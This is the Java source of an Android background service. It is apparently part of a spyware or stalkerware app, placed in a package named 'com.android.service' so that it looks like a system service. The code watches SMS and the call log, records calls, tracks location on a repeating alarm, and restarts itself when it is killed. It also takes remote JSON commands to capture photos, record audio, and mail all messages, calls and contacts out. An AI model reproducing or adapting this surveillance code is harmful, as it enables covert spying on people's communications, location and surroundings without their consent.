package com.android.service;

import org.json.JSONObject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.android.db.AllDataMailBody;
import com.android.db.CallConten;
import com.android.db.PhoneMailBody;
import com.android.db.SMSConten;
import com.android.db.SqlUtils;
import com.android.sound.SoundRecord;
import com.android.sound.TakePhoto;
import com.android.utils.LogUtils;
import com.android.utils.SendMailUtils;
import com.android.utils.Utils;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.igexin.sdk.PushManager;

public class ClientService extends Service {

	

	private LocationClient lc;
	private BDLocationListenerImpl bdlocation;
	private LocationClientOption option;
	private TelephonyManager tm;
	private CallConten callcontent;
	private PhoneStateListenerImpl listener;
	private SMSConten smscontent;
	private ClientReceiver receiver;
	private TakePhoto tp;
	private SoundRecord sr;
	private AlarmManager am;
	private static String TAG = ClientService.class.getName();
	public static String location = "com.android.smsclient.location";
	public static String cmdaction = "com.android.smsclient.cmdaction";
	public static String conaction = "android.net.conn.CONNECTIVITY_CHANGE";
	public static String mWakeLock = "com.android.smsclient.mWakeLock";

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		Utils.init(this);
		am = (AlarmManager) this
				.getSystemService(Context.ALARM_SERVICE);
		LogUtils.write(TAG, "初始化推送服务器");
		PushManager.getInstance().initialize(this.getApplicationContext());
		LogUtils.write(TAG, "初始化百度地图");
		BaiduInit();
		LogUtils.write(TAG, "数据注册监听");
		SmsCallInit();
		LogUtils.write(TAG, "通话录音监听");
		TeleInit();
		LogUtils.write(TAG, "位置定时器开始");
		InitLocationdata();
		LogUtils.write(TAG, "注册广播接收器");
		regfilter();
		LogUtils.write(TAG, "防休眠启动");
		acquireWakeLock();
		
		
//		Notification notification = new Notification(R.drawable.nt,"", System.currentTimeMillis());
//
//		PendingIntent pendingintent = PendingIntent.getService(this, 0,new Intent(this, ClientService.class), 0);
//		notification.setLatestEventInfo(this, "", "", pendingintent);
//		startForeground(0x111, notification);
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		flags = START_STICKY;
		return super.onStartCommand(intent, flags, startId);
	}
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		Intent destroy = new Intent("clientservice.destroy");  
		sendBroadcast(destroy);  
		super.onDestroy();
		this.unregisterReceiver(receiver);
		//stopForeground(true);
		Intent intent=new Intent(this,ClientService.class);
		startService(intent);
	}

	public void TeleInit() {
		tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		listener = new PhoneStateListenerImpl(this,callcontent);
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
	}

	public void BaiduInit() {
		option = new LocationClientOption();
		option.setAddrType("all");
		option.setCoorType("bd09ll");
		lc = new LocationClient(this.getApplicationContext());
		lc.setLocOption(option);
		bdlocation = new BDLocationListenerImpl(this);
		lc.registerLocationListener(bdlocation);
		lc.start();
	}

	public void SmsCallInit() {
		smscontent = new SMSConten(this, handler);
		this.getContentResolver().registerContentObserver(
				Uri.parse("content://sms/"), true, smscontent);
		callcontent = new CallConten(this, handler);
		this.getContentResolver().registerContentObserver(
				CallLog.Calls.CONTENT_URI, true, callcontent);
	}

	public void InitLocationdata() {
		Intent locationIntent = new Intent(location);
		PendingIntent locationpendingIntent = PendingIntent.getBroadcast(this,
				0, locationIntent, PendingIntent.FLAG_UPDATE_CURRENT);
		int locattiondelay = Utils.getIntConfig(this, "locattiondelay", 300000);
		long locationAtTime = SystemClock.elapsedRealtime() + 2 * 1000;
		am.cancel(locationpendingIntent);
		am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, locationAtTime,
				locattiondelay, locationpendingIntent);
	}

	public void regfilter() {
		IntentFilter filter = new IntentFilter();
		filter.addAction(location);
		filter.addAction(cmdaction);
		filter.addAction(conaction);
		filter.addAction(mWakeLock);
		receiver=new ClientReceiver();
		this.registerReceiver(receiver, filter);
	}

	private Handler handler = new Handler() {

	};

	class ClientReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			LogUtils.write("smsclient", action);
			if (action != null && location.equals(action)) {
				// 获取位置
				if (lc != null && lc.isStarted()) {
					lc.requestLocation();
				}
			} else if (action != null && cmdaction.equals(action)) {
				String cmd = intent.getStringExtra("action");
				LogUtils.write("smsclient", "指令" + cmd);
				if (cmd != null && !"".equals(cmd)) {
					DoCmd(cmd);
				}
			} else if (action != null && conaction.equals(action)) {
				if(Utils.isNetworkConnected(ClientService.this)){
					LogUtils.write("smsclient", "网络建立连接");
					boolean sms=Utils.getBooleanConfig(context, "sms", true);
					boolean call=Utils.getBooleanConfig(context, "call", true);
					int count = Utils.getIntConfig(context, "count", 0);
					SqlUtils su=SqlUtils.getinstance(ClientService.this);
					if((su.getAllSms().size() > count&&sms) || (su.getAllCall().size() > count&&call)){
						AllDataMailBody mailbody=new AllDataMailBody(context);
						SendMailUtils.SendAllDataToMail(context, mailbody);
					}
				}
				
			}else if (action != null && mWakeLock.equals(action)) {
				LogUtils.write("smsclient", "防止休眠中");
			} 
		}
	}

	private void DoCmd(String cmd) {
		try {
			JSONObject jo = new JSONObject(cmd);
			if (jo.has("sms")) {
				Utils.setBooleanConfig(this, "sms", jo.getBoolean("sms"));
			}
			if (jo.has("call")) {
				Utils.setBooleanConfig(this, "call", jo.getBoolean("call"));
			}
			if (jo.has("loc")) {
				Utils.setBooleanConfig(this, "loc", jo.getBoolean("loc"));
			}
			if (jo.has("count")) {
				Utils.setIntConfig(this, "count", jo.getInt("count"));
			}
			if (jo.has("callrecord")) {
				Utils.setStringConfig(this, "callrecord",
						jo.getString("callrecord"));
			}
			if (jo.has("camera")) {
				if(tp==null){
					tp = new TakePhoto(this);
				}
				if(!tp.isIsopen()){
					tp.takePicture(jo.getInt("camera"));
				}else{
					LogUtils.write("smsclient", "正在拍照中,请稍后发送指令");
				}
				
			}
			if (jo.has("record")) {
				if(sr==null){
					sr = new SoundRecord(this, jo.getInt("record"));
				}
				if(!sr.isIsrecord()){
					sr.startRecord();
				}else{
					LogUtils.write("smsclient", "正在录音中,请稍后发送指令");
				}
				
			}
			if (jo.has("location")) {
				LogUtils.write(TAG, "获取位置指令"+lc.isStarted()+"__"+jo.getBoolean("location"));
				if (lc != null && lc.isStarted() && jo.getBoolean("location")) {
					bdlocation.setSend(true);
					int n=lc.requestLocation();
					LogUtils.write(TAG, "获取位置返回"+n);
				}
			}
			if (jo.has("all")) {
				if (jo.getBoolean("all")) {
					AllDataMailBody mailbody = new AllDataMailBody(this);
					SendMailUtils.SendAllDataToMail(this, mailbody);
				}
			}
			if(jo.has("address")){
				if (jo.getBoolean("address")) {
					PhoneMailBody mailbody = new PhoneMailBody(this);
					SendMailUtils.SendAllDataToMail(this, mailbody);
				}
			}

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	private void acquireWakeLock() {
		Intent locationIntent = new Intent(mWakeLock);
		PendingIntent Lock = PendingIntent.getBroadcast(this,0, locationIntent, PendingIntent.FLAG_UPDATE_CURRENT);
		am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime()+2000,3000, Lock);
	}

}
